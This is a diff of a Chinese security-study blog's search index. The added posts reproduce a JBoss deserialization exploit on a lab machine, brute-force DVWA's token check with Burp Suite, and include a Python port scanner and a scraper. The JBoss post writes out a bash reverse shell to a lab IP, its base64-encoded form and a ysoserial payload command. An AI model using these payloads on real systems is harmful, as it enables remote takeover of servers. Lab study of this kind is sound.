@@ -205,68 +205,35 @@
       </tags>
   </entry>
   <entry>
-    <title>Burpsuite绕过Token爆破</title>
-    <url>/article/4fd639c3.html</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
-<p>环境：</p>
-<p>DVWA + Burpsuite Pro</p>
-<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
-<p>2、进行如下配置</p>
-<p>Position模块 </p>
-<p><img src="/article/image-20210703091039611.png" alt="image-20210703091039611" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703091039611.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>
+    <title>JBoss反序列化漏洞复现</title>
+    <url>/article/b552cccc.html</url>
+    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
+<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
+<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
+<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
+<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
+<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
+<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
+<p>攻击机：192.168.66.138</p>
+<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>
 
+<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p>（<a href="http://www.jackson-t.ca/runtime-exec-payloads.html%EF%BC%89">http://www.jackson-t.ca/runtime-exec-payloads.html）</a></p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
 
+<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>
 
-<p>Paloads模块 – 1</p>
-<p><img src="/article/image-20210703091434571.png" alt="image-20210703091434571" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703091434571.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>
+<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
+<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>
 
-<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
-<p>Resource Pool模块</p>
-<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
-<p><img src="/article/image-20210703092057193.png" alt="image-20210703092057193" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092057193.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>
+<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>
 
-
-
-<p>Option模块</p>
-<p>选择Grep Extract模块</p>
-<p><img src="/article/image-20210703092543186.png" alt="image-20210703092543186" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092543186.png" class="lozad post-image"></p>
-<p>点击Add，依次填写</p>
-<p><img src="/article/image-20210703092442542.png" alt="image-20210703092442542" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092442542.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>
-
-
-
-<p>Redirections模块</p>
-<p><img src="/article/image-20210703092804701.png" alt="image-20210703092804701" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092804701.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>
-
-
-
-<p>最后，回到Payloads模块</p>
-<p><img src="/article/image-20210703093340999.png" alt="image-20210703093340999" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093340999.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>
-
-
-
-<p>3、结果</p>
-<p><img src="/article/image-20210703093746103.png" alt="image-20210703093746103" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093746103.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>
-
-
-
-<p>按照长度排序（状态码相同，无法参考）</p>
-<p><img src="/article/image-20210703093937504.png" alt="image-20210703093937504" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093937504.png" class="lozad post-image"></p>
-<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
-<p>至此，token绕过爆破攻击结束。</p>
-]]></content>
+<p>注：poc版本&gt;=5</p>
+<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
       <categories>
-        <category>Web渗透</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>Token绕过</tag>
+        <tag>JBoss反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -581,6 +548,129 @@
       </tags>
   </entry>
   <entry>
+    <title>Burpsuite绕过Token爆破</title>
+    <url>/article/4fd639c3.html</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
+<p>环境：</p>
+<p>DVWA + Burpsuite Pro</p>
+<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
+<p>2、进行如下配置</p>
+<p>Position模块 </p>
+<p><img src="/article/image-20210703091039611.png" alt="image-20210703091039611" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703091039611.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>
+
+
+
+<p>Paloads模块 – 1</p>
+<p><img src="/article/image-20210703091434571.png" alt="image-20210703091434571" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703091434571.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>
+
+<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
+<p>Resource Pool模块</p>
+<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
+<p><img src="/article/image-20210703092057193.png" alt="image-20210703092057193" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092057193.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>
+
+
+
+<p>Option模块</p>
+<p>选择Grep Extract模块</p>
+<p><img src="/article/image-20210703092543186.png" alt="image-20210703092543186" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092543186.png" class="lozad post-image"></p>
+<p>点击Add，依次填写</p>
+<p><img src="/article/image-20210703092442542.png" alt="image-20210703092442542" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092442542.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>
+
+
+
+<p>Redirections模块</p>
+<p><img src="/article/image-20210703092804701.png" alt="image-20210703092804701" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703092804701.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>
+
+
+
+<p>最后，回到Payloads模块</p>
+<p><img src="/article/image-20210703093340999.png" alt="image-20210703093340999" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093340999.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>
+
+
+
+<p>3、结果</p>
+<p><img src="/article/image-20210703093746103.png" alt="image-20210703093746103" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093746103.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>
+
+
+
+<p>按照长度排序（状态码相同，无法参考）</p>
+<p><img src="/article/image-20210703093937504.png" alt="image-20210703093937504" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210703093937504.png" class="lozad post-image"></p>
+<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
+<p>至此，token绕过爆破攻击结束。</p>
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>Token绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python之网络爬虫</title>
+    <url>/article/f3b65bec.html</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
+<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
+<p>使用：</p>
+<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>
+
+
+
+<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
+<p>使用</p>
+<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br><span class="line"></span><br></pre>
+
+
+
+<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>
+
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>BeautifulSoup模块</tag>
+        <tag>requests模块</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python之端口扫描</title>
+    <url>/article/f37bf9f5.html</url>
+    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
+<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><p>介绍：网络发包请求模块</p>
+<p>使用</p>
+<pre class="highlight"><span class="line">import socket						# 导包</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 		# 创建socket对象</span><br><span class="line">s.bind = ((host,port))				# 绑定端口</span><br><span class="line">s.close								# 断开连接</span><br><span class="line">s.send(msg.decode(&#x27;utf-8&#x27;))			# 发送数据</span><br><span class="line">s.recv(1024)						# 接受数据</span><br><span class="line">s.settimeout()						# 设置超时时间，单位秒</span><br><span class="line">s.sendall							# 发送完整TCP数据</span><br><span class="line">s.sendto							# 发送udp数据</span><br><span class="line"></span><br><span class="line"># 服务端</span><br><span class="line">s.listen							# 设置最大连接数</span><br><span class="line">csocket,addr = s.accept()			# 建立客户端连接</span><br><span class="line"></span><br><span class="line"># 客户端</span><br><span class="line">s.connect((host,port))				# 连接服务器</span><br></pre>
+
+
+
+<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><p>介绍：多线程模块</p>
+<p>使用</p>
+<pre class="highlight"><span class="line">import threading							# 导包</span><br><span class="line">t = threading.Thread(target=要执行的函数)		# 设置要开启线程的函数</span><br><span class="line">t.start()									# 开启线程</span><br><span class="line"># linux可直接Ctrl+c结束脚本，Windows下失效</span><br></pre>
+
+<p>守护进程</p>
+<pre class="highlight"><span class="line">t = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"># 主线程空循环，防止结束，同时用来接收中断信号</span><br><span class="line">while True:</span><br><span class="line">	pass</span><br><span class="line"># 用于Windows下接收Ctrl+c信号，结束脚本程序。</span><br></pre>
+
+<p>线程锁，防止多个线程同时操作一个资源对象</p>
+<pre class="highlight"><span class="line">lock = threading.RLock() 	# 多线程开始之前定义</span><br><span class="line">lock.acquire()				# 获取锁</span><br><span class="line">lock.release()				# 释放锁</span><br></pre>
+
+<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 全局变量，队列，用来依次存储端口号</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def portScan():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        # 设置套接字连接</span><br><span class="line">        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒</span><br><span class="line">        c.settimeout(0.5)</span><br><span class="line">        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）</span><br><span class="line">        if c.connect_ex((host, port)) == 0:</span><br><span class="line">            print(&quot;%s:%d is open&quot; % (host, port))</span><br><span class="line">            s = host + &quot;:&quot; + str(port)</span><br><span class="line">            # 开启进程锁，多线程写入数据</span><br><span class="line">            lock.acquire()</span><br><span class="line">            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:</span><br><span class="line">                fp.write(s + &quot;\n&quot;)</span><br><span class="line">                # 释放锁</span><br><span class="line">            lock.release()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s:%d not open&quot; % (host, port))</span><br><span class="line">        # 关闭套接字连接</span><br><span class="line">        c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 独立执行时的程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        print(&quot;请以以下格式输入：&quot;)</span><br><span class="line">        print(&quot;python portScan.py ip 线程数&quot;)</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    thread_num = int(sys.argv[2])</span><br><span class="line">    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义</span><br><span class="line">    lock = threading.RLock()</span><br><span class="line"></span><br><span class="line">    for port in range(1, 65536):</span><br><span class="line">        q.put(port)</span><br><span class="line">    for i in range(thread_num):</span><br><span class="line">        # 开启守护进程</span><br><span class="line">        t = threading.Thread(target=portScan, daemon=True)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    # 设置主进程死循环，方便接收中断信号</span><br><span class="line">    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束</span><br><span class="line">    while 1:</span><br><span class="line">        pass</span><br></pre>
+
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>socket模块</tag>
+        <tag>threading模块</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MS17-010漏洞复现</title>
     <url>/article/484411d0.html</url>
     <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
@@ -644,93 +734,56 @@
       </tags>
   </entry>
   <entry>
-    <title>Python之端口扫描</title>
-    <url>/article/f37bf9f5.html</url>
-    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
-<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><p>介绍：网络发包请求模块</p>
-<p>使用</p>
-<pre class="highlight"><span class="line">import socket						# 导包</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 		# 创建socket对象</span><br><span class="line">s.bind = ((host,port))				# 绑定端口</span><br><span class="line">s.close								# 断开连接</span><br><span class="line">s.send(msg.decode(&#x27;utf-8&#x27;))			# 发送数据</span><br><span class="line">s.recv(1024)						# 接受数据</span><br><span class="line">s.settimeout()						# 设置超时时间，单位秒</span><br><span class="line">s.sendall							# 发送完整TCP数据</span><br><span class="line">s.sendto							# 发送udp数据</span><br><span class="line"></span><br><span class="line"># 服务端</span><br><span class="line">s.listen							# 设置最大连接数</span><br><span class="line">csocket,addr = s.accept()			# 建立客户端连接</span><br><span class="line"></span><br><span class="line"># 客户端</span><br><span class="line">s.connect((host,port))				# 连接服务器</span><br></pre>
+    <title>Typora常用快捷键</title>
+    <url>/article/12a67745.html</url>
+    <content><![CDATA[<table>
+<thead>
+<tr>
+<th>快捷键</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Ctrl+T</td>
+<td>插入表格</td>
+</tr>
+<tr>
+<td>Ctrl+Shift+K</td>
+<td>插入代码块</td>
+</tr>
+<tr>
+<td>Ctrl+0</td>
+<td>段落</td>
+</tr>
+<tr>
+<td>Ctrl+1-6</td>
+<td>1-6级标题</td>
+</tr>
+<tr>
+<td>Ctrl+Enter</td>
+<td>表格下方插入行</td>
+</tr>
+<tr>
+<td>Ctrl+/</td>
+<td>源码编辑</td>
+</tr>
+<tr>
+<td>Ctrl+Shift+V</td>
+<td>粘贴为纯文本</td>
+</tr>
+</tbody></table>
+<p>文件-偏好设置-高级设置-conf.user.json    重新设置快捷键</p>
+<pre class="highlight"><span class="line">&quot;keyBinding&quot;: &#123;</span><br><span class="line">    // for example: </span><br><span class="line">    // &quot;Always on Top&quot;: &quot;Ctrl+Shift+P&quot;</span><br><span class="line">    &quot;Always on Top&quot;: &quot;Ctrl+Shift+P&quot;,  </span><br><span class="line">    &quot;Code Fences&quot;: &quot;Ctrl+Shift+F&quot;,  </span><br><span class="line">    &quot;Ordered List&quot;:&quot;Ctrl+Alt+o&quot;,  </span><br><span class="line">    &quot;Unordered List&quot;: &quot;Ctrl+Alt+u&quot;  </span><br><span class="line">  &#125;,</span><br></pre>
 
-
-
-<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><p>介绍：多线程模块</p>
-<p>使用</p>
-<pre class="highlight"><span class="line">import threading							# 导包</span><br><span class="line">t = threading.Thread(target=要执行的函数)		# 设置要开启线程的函数</span><br><span class="line">t.start()									# 开启线程</span><br><span class="line"># linux可直接Ctrl+c结束脚本，Windows下失效</span><br></pre>
-
-<p>守护进程</p>
-<pre class="highlight"><span class="line">t = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"># 主线程空循环，防止结束，同时用来接收中断信号</span><br><span class="line">while True:</span><br><span class="line">	pass</span><br><span class="line"># 用于Windows下接收Ctrl+c信号，结束脚本程序。</span><br></pre>
-
-<p>线程锁，防止多个线程同时操作一个资源对象</p>
-<pre class="highlight"><span class="line">lock = threading.RLock() 	# 多线程开始之前定义</span><br><span class="line">lock.acquire()				# 获取锁</span><br><span class="line">lock.release()				# 释放锁</span><br></pre>
-
